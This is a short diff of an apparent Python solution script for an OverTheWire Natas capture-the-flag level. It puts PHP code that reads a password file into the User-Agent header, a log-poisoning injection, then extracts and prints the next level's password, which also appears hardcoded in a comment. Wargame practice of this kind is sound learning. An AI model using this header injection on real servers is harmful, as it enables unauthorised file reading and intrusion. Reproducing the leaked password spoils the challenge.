@@ -112,3 +112,8 @@ session.headers['User-Agent'] = "<? echo file_get_contents('/etc/natas_webpass/n
 response = session.get(URL, params=params, headers=session.headers)
 div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
 print(f'{div_content}\n')
+
+
+# natas26 password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+password = re.search(r'] (\w+)\n', str(div_content))[1]
+print(f'natas26 password: {password}')
